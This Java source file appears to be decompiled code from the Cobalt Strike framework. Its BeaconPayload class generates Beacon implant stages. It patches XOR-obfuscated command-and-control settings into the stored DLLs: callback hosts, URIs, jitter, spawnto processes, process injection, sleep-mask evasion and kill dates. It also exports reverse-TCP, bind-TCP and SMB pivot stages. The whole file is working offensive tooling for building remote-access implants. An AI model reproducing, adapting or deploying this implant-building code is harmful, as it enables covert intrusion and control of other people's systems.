package beacon;

import beacon.setup.ProcessInject;
import c2profile.Profile;
import common.AssertUtils;
import common.CommonUtils;
import common.MudgeSanity;
import common.Packer;
import common.ProxyServer;
import common.ScListener;
import common.SleevedResource;
import dns.QuickSecurity;

import java.io.IOException;
import java.io.InputStream;
import java.util.LinkedList;

import pe.MalleablePE;
import pe.PEParser;

public class BeaconPayload extends BeaconConstants {
    public static final int EXIT_FUNC_PROCESS = 0;

    public static final int EXIT_FUNC_THREAD = 1;

    protected Profile c2profile = null;

    protected MalleablePE pe = null;

    protected byte[] publickey = new byte[0];

    protected ScListener listener = null;

    protected int funk = 0;

    public BeaconPayload(ScListener scListener, int n) {
        this.listener = scListener;
        this.c2profile = scListener.getProfile();
        this.publickey = scListener.getPublicKey();
        this.pe = new MalleablePE(this.c2profile);
        this.funk = n;
    }

    public static byte[] beacon_obfuscate(byte[] arrby) {
        byte[] arrby1 = new byte[arrby.length];
        for (int i = 0; i < arrby.length; i++) {
            arrby1[i] = (byte) (arrby[i] ^ 0x2E);
        }
        return arrby1;
    }

    public byte[] exportBeaconStageHTTP(int n, String string1,
                                        boolean bl1, boolean bl2, String string2) {
        AssertUtils.TestSetValue(string2, "x86, x64");
        String str = "";
        if ("x86".equals(string2)) {
            str = "resources/beacon.dll";
        } else if ("x64".equals(string2)) {
            str = "resources/beacon.x64.dll";
        }
        return this.pe.process(exportBeaconStage(n, string1, bl1, bl2, str), string2);
    }

    public byte[] exportBeaconStageDNS(int n, String string1,
                                       boolean bl1, boolean bl2, String string2) {
        AssertUtils.TestSetValue(string2, "x86, x64");
        String str = "";
        if ("x86".equals(string2)) {
            str = "resources/dnsb.dll";
        } else if ("x64".equals(string2)) {
            str = "resources/dnsb.x64.dll";
        }
        return this.pe.process(exportBeaconStage(n, string1, bl1, bl2, str), string2);
    }

    protected void setupKillDate(Settings settings) {
        settings.addShort(55, this.funk);
        if (!this.c2profile.hasString(".killdate")) {
            settings.addInt(40, 0);
            return;
        }
        String str = this.c2profile.getString(".killdate");
        String[] arrstring = str.split("-");
        int s1 = CommonUtils.toNumber(arrstring[0], 0) * 10000;
        int s2 = CommonUtils.toNumber(arrstring[1], 0) * 100;
        int s3 = CommonUtils.toNumber(arrstring[2], 0);
        settings.addInt(40, s1 + s2 + s3);
    }

    protected void setupGargle(Settings settings, String string) throws IOException {
        if (!this.c2profile.option(".stage.sleep_mask")) {
            settings.addInt(41, 0);
            return;
        }
        PEParser pEParser = PEParser.load(SleevedResource.readResource(string));
        boolean bool1 = this.c2profile.option(".stage.obfuscate");
        boolean bool2 = this.c2profile.option(".stage.userwx");
        int end = pEParser.sectionEnd(".text");
        settings.addInt(41, end);
        int address = pEParser.sectionAddress(".rdata") - end;
        if (address < 256) {
            CommonUtils.print_error(".stage.sleep_mask is true; nook space in " + string + " is " + address + " bytes. Beacon will crash.");
        }
        Packer packer = new Packer();
        packer.little();
        if (!bool1) {
            packer.addInt(0);
            packer.addInt(4096);
        }
        for (String str : pEParser.SectionsTable()) {
            if (".text".equals(str) && !bool2) {
                continue;
            }
            packer.addInt(pEParser.sectionAddress(str));
            packer.addInt(pEParser.sectionEnd(str));
        }
        packer.addInt(0);
        packer.addInt(0);
        settings.addData(42, packer.getBytes(), (int) packer.size());
    }

    protected byte[] exportBeaconStage(int n, String string1,
                                       boolean bl1, boolean bl2, String string2) {
        try {
            long l1 = System.currentTimeMillis();
            byte[] resource = SleevedResource.readResource(string2);
            if (string1.length() > 254) {
                string1 = string1.substring(0, 254);
            }
            String[] strs1 = this.c2profile.getString(".http-get.uri").split(" ");
            String[] arrstring2 = string1.split(",\\s*");
            LinkedList linkedList = new LinkedList();
            for (int b1 = 0; b1 < arrstring2.length; b1++) {
                linkedList.add(arrstring2[b1]);
                linkedList.add(CommonUtils.pick(strs1));
            }
            while (linkedList.size() > 2 && CommonUtils.join(linkedList, ",").length() > 255) {
                String str5 = linkedList.removeLast() + "";
                String str6 = linkedList.removeLast() + "";
                CommonUtils.print_info("dropping " + str6 + str5 + " from Beacon profile for size");
            }
            String str1 = randua(this.c2profile);
            int i = Integer.parseInt(this.c2profile.getString(".sleeptime"));
            String str2 = CommonUtils.pick(this.c2profile.getString(".http-post.uri").split(" "));
            byte[] arrby2 = this.c2profile.recover_binary(".http-get.server.output");
            byte[] arrby3 = this.c2profile.apply_binary(".http-get.client");
            byte[] arrby4 = this.c2profile.apply_binary(".http-post.client");
            int size = this.c2profile.size(".http-get.server.output", 1048576);
            int jitter = Integer.parseInt(this.c2profile.getString(".jitter"));
            if (jitter < 0 || jitter > 99) {
                jitter = 0;
            }
            int maxdns = Integer.parseInt(this.c2profile.getString(".maxdns"));
            if (maxdns < 0 || maxdns > 255) {
                maxdns = 255;
            }
            int b2 = 0;
            if (bl1) {
                b2 |= 1;
            }
            if (bl2) {
                b2 |= 0x8;
            }
            long dns_idle = CommonUtils.ipToLong(this.c2profile.getString(".dns_idle"));
            int dns_sleep = Integer.parseInt(this.c2profile.getString(".dns_sleep"));
            Settings settings = new Settings();
            settings.addShort(1, b2);
            settings.addShort(2, n);
            settings.addInt(3, i);
            settings.addInt(4, size);
            settings.addShort(5, jitter);
            settings.addShort(6, maxdns);
            settings.addData(7, this.publickey, 256);
            settings.addString(8, CommonUtils.join(linkedList, ","), 256);
            settings.addString(9, str1, 128);
            settings.addString(10, str2, 64);
            settings.addData(11, arrby2, 256);
            settings.addData(12, arrby3, 256);
            settings.addData(13, arrby4, 256);
            settings.addData(14, CommonUtils.asBinary(this.c2profile.getString(".spawnto")), 16);
            settings.addString(29, this.c2profile.getString(".post-ex.spawnto_x86"), 64);
            settings.addString(30, this.c2profile.getString(".post-ex.spawnto_x64"), 64);
            settings.addString(15, "", 128);
            settings.addShort(31, QuickSecurity.getCryptoScheme());
            settings.addInt(19, (int) dns_idle);
            settings.addInt(20, dns_sleep);
            settings.addString(26, this.c2profile.getString(".http-get.verb"), 16);
            settings.addString(27, this.c2profile.getString(".http-post.verb"), 16);
            settings.addInt(28, this.c2profile.shouldChunkPosts() ? 96 : 0);
            settings.addInt(37, this.c2profile.getInt(".watermark"));
            settings.addShort(38, this.c2profile.option(".stage.cleanup") ? 1 : 0);
            settings.addShort(39, this.c2profile.exerciseCFGCaution() ? 1 : 0);
            String hostHeader = this.listener.getHostHeader();
            if (hostHeader == null || hostHeader.length() == 0) {
                settings.addString(54, "", 128);
            } else if (Profile.usesHostBeacon(this.c2profile)) {
                settings.addString(54, "", 128);
            } else {
                settings.addString(54, "Host: " + this.listener.getHostHeader() + "\r\n", 128);
            }
            if (Profile.usesCookieBeacon(this.c2profile)) {
                settings.addShort(50, 1);
            } else {
                settings.addShort(50, 0);
            }
            ProxyServer proxyServer = ProxyServer.parse(this.listener.getProxyString());
            proxyServer.setup(settings);
            setupKillDate(settings);
            setupGargle(settings, string2);
            new ProcessInject(this.c2profile).apply(settings);
            byte[] patch = settings.toPatch();
            patch = beacon_obfuscate(patch);
            String str4 = CommonUtils.bString(resource);
            int i1 = str4.indexOf("AAAABBBBCCCCDDDDEEEEFFFF");
            str4 = CommonUtils.replaceAt(str4, CommonUtils.bString(patch), i1);
            return CommonUtils.toBytes(str4);
        } catch (IOException iOException) {
            MudgeSanity.logException("export Beacon stage: " + string2, iOException, false);
            return new byte[0];
        }
    }

    public byte[] exportReverseTCPStage(String string) {
        return string.equals("x64") ? this.pe.process(exportTCPDLL("resources/pivot.x64.dll", "reverse"), string) : this.pe.process(exportTCPDLL("resources/pivot.dll", "reverse"), string);
    }

    public byte[] exportBindTCPStage(String string) {
        return string.equals("x64") ? this.pe.process(exportTCPDLL("resources/pivot.x64.dll", "bind"), string) : this.pe.process(exportTCPDLL("resources/pivot.dll", "bind"), string);
    }

    public byte[] exportSMBStage(String string) {
        return string.equals("x64") ? this.pe.process(exportSMBDLL("resources/pivot.x64.dll"), string) : this.pe.process(exportSMBDLL("resources/pivot.dll"), string);
    }

    public byte[] exportSMBDLL(String string) {
        try {
            long l = System.currentTimeMillis();
            byte[] arrby1 = SleevedResource.readResource(string);
            String str1 = this.listener.getPipeName(".");
            Settings settings = new Settings();
            settings.addShort(1, 2);
            settings.addShort(2, 4444);
            settings.addInt(3, 10000);
            settings.addInt(4, 1048576);
            settings.addShort(5, 0);
            settings.addShort(6, 0);
            settings.addData(7, this.publickey, 256);
            settings.addString(8, "", 256);
            settings.addString(9, "", 128);
            settings.addString(10, "", 64);
            settings.addString(11, "", 256);
            settings.addString(12, "", 256);
            settings.addString(13, "", 256);
            settings.addData(14, CommonUtils.asBinary(this.c2profile.getString(".spawnto")), 16);
            settings.addString(29, this.c2profile.getString(".post-ex.spawnto_x86"), 64);
            settings.addString(30, this.c2profile.getString(".post-ex.spawnto_x64"), 64);
            settings.addString(15, str1, 128);
            settings.addShort(31, QuickSecurity.getCryptoScheme());
            setupKillDate(settings);
            settings.addInt(37, this.c2profile.getInt(".watermark"));
            settings.addShort(38, this.c2profile.option(".stage.cleanup") ? 1 : 0);
            settings.addShort(39, this.c2profile.exerciseCFGCaution() ? 1 : 0);
            setupGargle(settings, string);
            (new ProcessInject(this.c2profile)).apply(settings);
            byte[] arrby2 = settings.toPatch();
            arrby2 = beacon_obfuscate(arrby2);
            String str2 = CommonUtils.bString(arrby1);
            int i = str2.indexOf("AAAABBBBCCCCDDDDEEEEFFFF");
            str2 = CommonUtils.replaceAt(str2, CommonUtils.bString(arrby2), i);
            return CommonUtils.toBytes(str2);
        } catch (IOException iOException) {
            MudgeSanity.logException("export SMB DLL", iOException, false);
            return new byte[0];
        }
    }

    public byte[] exportTCPDLL(String string1, String string2) {
        AssertUtils.TestSetValue(string2, "bind, reverse");
        try {
            long l = System.currentTimeMillis();
            byte[] arrby1 = SleevedResource.readResource(string1);
            Settings settings = new Settings();
            if ("bind".equals(string2)) {
                settings.addShort(1, 16);
            } else {
                settings.addShort(1, 4);
            }
            settings.addShort(2, this.listener.getPort());
            settings.addInt(3, 10000);
            settings.addInt(4, 1048576);
            settings.addShort(5, 0);
            settings.addShort(6, 0);
            settings.addData(7, this.publickey, 256);
            if ("bind".equals(string2)) {
                if (this.listener.isLocalHostOnly()) {
                    settings.addInt(49, (int) CommonUtils.ipToLong("127.0.0.1"));
                } else {
                    settings.addInt(49, (int) CommonUtils.ipToLong("0.0.0.0"));
                }
            } else {
                settings.addString(8, this.listener.getStagerHost(), 256);
            }
            settings.addString(9, "", 128);
            settings.addString(10, "", 64);
            settings.addString(11, "", 256);
            settings.addString(12, "", 256);
            settings.addString(13, "", 256);
            settings.addData(14, CommonUtils.asBinary(this.c2profile.getString(".spawnto")), 16);
            settings.addString(29, this.c2profile.getString(".post-ex.spawnto_x86"), 64);
            settings.addString(30, this.c2profile.getString(".post-ex.spawnto_x64"), 64);
            settings.addString(15, "", 128);
            settings.addShort(31, QuickSecurity.getCryptoScheme());
            setupKillDate(settings);
            settings.addInt(37, this.c2profile.getInt(".watermark"));
            settings.addShort(38, this.c2profile.option(".stage.cleanup") ? 1 : 0);
            settings.addShort(39, this.c2profile.exerciseCFGCaution() ? 1 : 0);
            setupGargle(settings, string1);
            (new ProcessInject(this.c2profile)).apply(settings);
            byte[] arrby2 = settings.toPatch();
            arrby2 = beacon_obfuscate(arrby2);
            String str = CommonUtils.bString(arrby1);
            int i = str.indexOf("AAAABBBBCCCCDDDDEEEEFFFF");
            str = CommonUtils.replaceAt(str, CommonUtils.bString(arrby2), i);
            return CommonUtils.toBytes(str);
        } catch (IOException iOException) {
            MudgeSanity.logException("export TCP DLL", iOException, false);
            return new byte[0];
        }
    }

    public static String randua(Profile profile) {
        if (profile.getString(".useragent").equals("<RAND>")) {
            try {
                InputStream inputStream = CommonUtils.resource("resources/ua.txt");
                String str = CommonUtils.pick(CommonUtils.bString(CommonUtils.readAll(inputStream)).split("\n"));
                inputStream.close();
                return str;
            } catch (IOException iOException) {
                MudgeSanity.logException("randua", iOException, false);
                return "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)";
            }
        }
        return profile.getString(".useragent");
    }
}
